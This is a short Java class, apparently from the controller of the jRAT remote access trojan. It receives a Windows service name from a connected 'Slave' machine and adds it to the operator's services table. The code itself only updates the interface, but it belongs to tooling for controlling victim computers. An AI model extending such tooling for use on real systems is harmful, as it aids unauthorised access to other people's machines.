package jrat.controller.packets.incoming;

import jrat.controller.Slave;
import jrat.controller.ui.frames.FrameControlPanel;
import jrat.controller.ui.panels.PanelControlServices;


public class Packet52WindowsService implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String name = slave.readLine();

		FrameControlPanel frame = FrameControlPanel.instances.get(slave);

		if (frame != null) {
			PanelControlServices panel = (PanelControlServices) frame.panels.get("windows services");
			panel.getModel().addRow(new Object[] { name });
		}
	}

}
